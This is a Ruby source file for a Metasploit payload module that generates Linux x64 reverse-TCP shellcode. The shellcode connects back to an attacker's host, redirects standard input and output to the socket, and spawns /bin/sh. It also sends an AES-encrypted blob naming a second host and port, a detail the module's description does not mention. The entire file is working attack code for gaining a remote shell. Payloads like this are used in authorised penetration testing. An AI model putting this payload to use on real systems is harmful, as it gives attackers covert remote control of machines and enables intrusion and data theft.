##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 90

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions
  include Rex::Crypto

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Linux x64 Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => 'Siras',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'Arch'          => ARCH_X64,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShellUnix,
      ))
  end


  def generate(opts={})


      iconn = datastore['IHOST']
      iconn += ":"
      iconn += datastore['IPORT']
      n = rand(9...50)
      r = Random.new.bytes(n-n%8)

      magic = r
      magic += Aes256.encrypt_aes256(datastore['IV'] , datastore['KEY'], iconn)

      ip = [IPAddr.new(datastore['LHOST'], Socket::AF_INET).to_i].pack('N').reverse.unpack('H*')[0]
      port = [datastore['LPORT'].to_i].pack('S>').reverse.unpack('H*')[0]

      payload = <<-EOS
        socket_call:
            ; int socket(int domain, int type, int protocol)
            mov    rax, 0x29                       
            mov    rdi, 0x2                          
            mov    rsi, 0x1                        
            syscall
            xchg   rdi, rax
            mov    rcx, 0x#{ip}#{port}0002 ; PORT IP
            push   rcx
            mov    rsi, rsp
            push   0x10
            pop    rdx

        connect_call:
            push   0x2a
            pop    rax                         
            syscall

        dup2_calls:
            push   0x3
            pop    rsi                          ; newfd 

        dup2_loop:
            push   0x21
            pop    rax                          ; dup2 syscall
            dec esi
            syscall
            loopnz   dup2_loop

        send_magic:
            xor    rax, rax
            mov    al, 0x01
        EOS
      magic.reverse.bytes.each_slice(8){|word|
        payload +=<<-EOS
            mov rbx, 0x#{word.pack("C*").unpack('H*')[0]}
            push   rbx
        EOS
      }
        payload += <<-EOS
            mov    dl, 0x#{'%02x' % magic.length}
            xor    rdi, rdi
            mov    rsi, rsp
            syscall
            xor    rdx, rdx
            xor    rsi, rsi

        exec_call:
            ; int execve(const char *filename, char *const argv[], char *const envp[]);
            push 0x3b
            pop rax                             ; execve call
            cdq                                 ; zero-out rdx via sign-extension
            mov rbx, '/bin/sh'
            push rbx
            push rsp
            pop rdi                             ; address of /bin/sh
            syscall
      EOS

      Metasm::Shellcode.assemble(Metasm::X86_64.new, payload).encode_string
  end
end
